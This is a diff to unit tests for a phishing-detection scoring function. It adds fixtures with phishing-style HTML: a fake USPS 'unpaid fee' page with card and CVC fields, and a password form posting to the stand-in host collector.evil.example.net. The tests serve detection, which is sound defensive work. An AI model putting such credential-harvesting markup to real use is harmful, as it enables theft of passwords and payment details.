@@ -6,7 +6,7 @@ import { computeRulesScore, determineStatus } from '../lib/rules';
 
 describe('Rules Scoring', () => {
   describe('computeRulesScore', () => {
-    it('should flag pages with password forms', () => {
+    it('notes a bare password form but keeps it clean (logins are normal)', () => {
       const html = `
         <html>
           <body>
@@ -21,7 +21,7 @@ describe('Rules Scoring', () => {
       const result = computeRulesScore(html, 'https://example.com');
       
       expect(result.flags.hasLoginForm).toBe(true);
-      expect(result.score).toBeGreaterThan(0.3);
+      expect(result.score).toBeLessThan(0.3);
       expect(result.reasons).toContain('Contains password input form');
     });
 
@@ -105,6 +105,39 @@ describe('Rules Scoring', () => {
       expect(result.flags.hasLoginForm).toBeFalsy();
       expect(result.flags.isCliDeploy).toBeFalsy();
       expect(result.flags.isNewAccount).toBeFalsy();
+    });
+
+    it('ignores brand names on pages that collect nothing (tutorials, blogs)', () => {
+      const html = `<h1>How to spot fake PayPal and Microsoft login pages</h1>
+        <p>Attackers claim your account has been suspended and ask you to verify your identity now.</p>`;
+      const r = computeRulesScore(html, 'https://security-blog.example.org/phishing');
+      expect(r.score).toBe(0);
+      expect(r.flags.hasBrandKeywords).toBeFalsy();
+    });
+
+    it('does not treat "Sign in with Google" SSO as impersonation', () => {
+      const html = `<h1>Acme</h1><form action="/session"><input type="password"></form>
+        <a href="https://accounts.google.com/o/oauth2">Sign in with Google</a>`;
+      const r = computeRulesScore(html, 'https://app.acme.example.com/login');
+      expect(r.flags.hasBrandKeywords).toBeFalsy();
+      expect(r.score).toBeLessThan(0.3);
+    });
+
+    it('flags card / seed-phrase collection with urgency and a brand', () => {
+      const html = `<title>USPS Delivery</title><p>Unpaid fee: your parcel is held.</p>
+        <form action="/pay"><input name="cc"><input name="cvc"></form>`;
+      const r = computeRulesScore(html, 'https://parcel-help.example.com');
+      expect(r.flags.hasSensitiveFields).toBe(true);
+      expect(r.flags.hasBrandKeywords).toBe(true);
+      expect(r.flags.hasUrgencyLanguage).toBe(true);
+      expect(r.score).toBeGreaterThanOrEqual(0.6);
+    });
+
+    it('flags a password form that posts to a different site', () => {
+      const html = `<form action="https://collector.evil.example.net/p"><input type="password"></form>`;
+      const r = computeRulesScore(html, 'https://login-portal.example.com');
+      expect(r.flags.hasExternalFormAction).toBe(true);
+      expect(r.score).toBeGreaterThanOrEqual(0.3);
     });
 
     it('should cap score at 1.0', () => {
